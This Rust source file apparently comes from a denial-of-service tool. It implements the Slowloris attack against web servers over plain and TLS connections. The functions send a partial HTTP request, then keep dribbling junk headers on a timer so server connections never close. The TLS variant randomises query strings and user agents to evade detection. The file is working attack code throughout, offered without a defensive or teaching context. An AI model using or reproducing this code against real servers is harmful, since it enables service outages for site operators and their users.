/*
        GET / HTTP/1.1\r\n
        HOST: host\r\n
        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3;     .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n
        Content-Length: 42\r\n
 */

// For std::thread::sleep_ms.
#![allow(deprecated)]
#![allow(non_snake_case)]

use std::io::{BufReader, Read, Write};
use std::thread::sleep_ms;
use std::sync::atomic::AtomicUsize;
use std::sync::Arc;
use std::sync::atomic::Ordering;
use std::convert::TryInto;
extern crate rand;
use rand::Rng;
use crate::gen_random;
pub fn slowloris<T: Sized + Write>(
    threadn: u16,
    connection: &mut T,
    opt:Arc<super::option::Opt>,
    _PACKETS_SEND:&AtomicUsize
) {
    // Start a valid HTTP request
    let initial_request = match &opt.cmd_mode[..] {
        "POST"=>{
            b"POST / HTTP/1.0\r\n"
        }
        "GET"=>{
             b"GET  / HTTP/1.0\r\n"
        }
        _=>{
            b"GET  / HTTP/1.0\r\n"
        }
    };

    connection.write_all(initial_request).unwrap_or_else(|e| {
        log::error!(
            "[REQUEST:{}] !!! Couldn't write GET request: {}",
            threadn, e
        );
        panic!();
    });
    log::debug!(
        "[REQUEST:{}] Wrote {} request.",
        threadn,
        opt.cmd_mode
    );

    // Delay cycle
    // Conditional here limits requests to one per ten milliseconds
    let real_cycles = if opt.cycles >= (opt.timeout as u32) / 10 {
        opt.cycles
    } else {
        log::warn!("[REQUEST] Too many cycles! Limiting.");
        (opt.timeout as u32) / 10
    };
    log::debug!(
        "[REQUEST:{}] Beginning delay bench: {} ms timeout, {} cycles, {} ms total.",
        threadn,
        opt.timeout,
        real_cycles,
        opt.timeout as u32 * real_cycles 
    );
    for _ in 0..(real_cycles) {
        sleep_ms(opt.timeout.try_into().unwrap());
        connection
            .write_all(b"X-Not-Real: \"Some Bullshit\"\r\n")
            .unwrap_or_else(|e| {
                log::debug!("[REQUEST:{}] !!! X-Not-Real Couldn't write header. {}", threadn, e);
                //panic!();
            });
            _PACKETS_SEND.fetch_add(1, Ordering::SeqCst);
    }
    
    for _ in 0..(real_cycles) {
        sleep_ms(opt.timeout.try_into().unwrap());
        connection
            .write_all(b"User-Agent: \"Some Bullshit\"\r\n")
            .unwrap_or_else(|e| {
                log::debug!("[REQUEST:{}] !!! User-Agent Couldn't write header. {}", threadn, e);
                //panic!();
            });
            _PACKETS_SEND.fetch_add(1, Ordering::SeqCst);
    }
    
    for _ in 0..(real_cycles) {
        sleep_ms(opt.timeout.try_into().unwrap());
        connection
            .write_all(b"Content-Length: 42\r\n")
            .unwrap_or_else(|e| {
                log::debug!("[REQUEST:{}] !!! Content-Length Couldn't write header. {}", threadn, e);
                //panic!();
            });
            _PACKETS_SEND.fetch_add(1, Ordering::SeqCst);
    }
    if opt.finalize {
        connection.write_all(b"\r\n").unwrap_or_else(|e| {
            log::debug!("[REQUEST:{}] !!! Couldn't write finalizer. {}", threadn, e);

            //panic!();
            
        });
        _PACKETS_SEND.fetch_add(1, Ordering::SeqCst);
        log::debug!("[REQUEST:{}] Wrote finalizer.", threadn);
    } else {
        log::debug!("[REQUEST:{}] Terminating without finalizer.", threadn);
    }
}


pub fn slowloris_tls(
    threadn: u16,
    connection: &mut rustls::ClientConnection,
    opt:Arc<super::option::Opt>,
    _PACKETS_SEND:&AtomicUsize
) {

    let mut rng =rand::thread_rng();

    // Start a valid HTTP request
    let method = match &opt.cmd_mode[..] {
        "POST"=>{
            "POST"
        }
        "GET"=>{
             "GET"
        }
        _=>{
            "GET"
        }
    };

    connection.writer().write_all(
        format!(
            "{} /?{} HTTP/1.1\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n",
            method,
            rng.gen::<u64>(),
            gen_random::gen_user_agent(&mut rng)
        )
        .as_bytes()
    ).unwrap_or_else(|e| {
        log::error!(
            "[REQUEST:{}] !!! Couldn't write GET request: {}",
            threadn, e
        );
        panic!();
    });
    log::debug!(
        "[REQUEST:{}] Wrote {} request.",
        threadn,
        opt.cmd_mode
    );

    // Delay cycle
    // Conditional here limits requests to one per ten milliseconds
    let real_cycles = if opt.cycles >= opt.timeout as u32 / 10 {
        opt.cycles
    } else {
        log::warn!("[REQUEST] Too many cycles! Limiting.");
        opt.timeout as u32 / 10
    };
    log::debug!(
        "[REQUEST:{}] Beginning delay bench: {} ms timeout, {} cycles, {} ms total.",
        threadn,
        opt.timeout,
        real_cycles,
        opt.timeout as u32 * real_cycles
    );

/*
    loop{
        sleep_ms(timeout.try_into().unwrap());
        connection
            .writer()
            .write_all(format!("X-Not-Real: \"Some Bullshit\" {}\r\n",rng.gen::<u64>()).as_bytes())
            .unwrap_or_else(|e| {
                log::debug!("[REQUEST:{}] !!! X-Not-Real Couldn't write header. {}", threadn, e);
                //panic!();
            });
        _PACKETS_SEND.fetch_add(1, Ordering::SeqCst);
    }
   */     
    
    for _ in 0..(real_cycles) {
        sleep_ms(opt.timeout.try_into().unwrap());
        connection
            .writer()//format!("X-a: {}\r\n", &self.rng.gen::<u64>()).as_bytes()
            .write_all(format!("X-Not-Real: \"Some Bullshit {}\" \r\n",rng.gen::<u64>()).as_bytes())
            .unwrap_or_else(|e| {
                log::debug!("[REQUEST:{}] !!! X-Not-Real Couldn't write header. {}", threadn, e);
                //panic!();
            });
            _PACKETS_SEND.fetch_add(1, Ordering::SeqCst);
    }
/*
    for _ in 0..(real_cycles) {
        sleep_ms(timeout.try_into().unwrap());
        connection
            .writer()
            .write_all(b"User-Agent: \"Some Bullshit\"\r\n")
            .unwrap_or_else(|e| {
                log::debug!("[REQUEST:{}] !!! User-Agent Couldn't write header. {}", threadn, e);
                //panic!();
            });
            _PACKETS_SEND.fetch_add(1, Ordering::SeqCst);
    }
    
    for _ in 0..(real_cycles) {
        sleep_ms(timeout.try_into().unwrap());
        connection
            .writer()
            .write_all(b"Content-Length: 42\r\n")
            .unwrap_or_else(|e| {
                log::debug!("[REQUEST:{}] !!! Content-Length Couldn't write header. {}", threadn, e);
                //panic!();
            });
            _PACKETS_SEND.fetch_add(1, Ordering::SeqCst);
    }
    if finalize {
        connection.writer().write_all(b"\r\n").unwrap_or_else(|e| {
            log::debug!("[REQUEST:{}] !!! Couldn't write finalizer. {}", threadn, e);

            //panic!();
            
        });
        _PACKETS_SEND.fetch_add(1, Ordering::SeqCst);
        log::debug!("[REQUEST:{}] Wrote finalizer.", threadn);
    } else {
        log::debug!("[REQUEST:{}] Terminating without finalizer.", threadn);
    }
    */
}
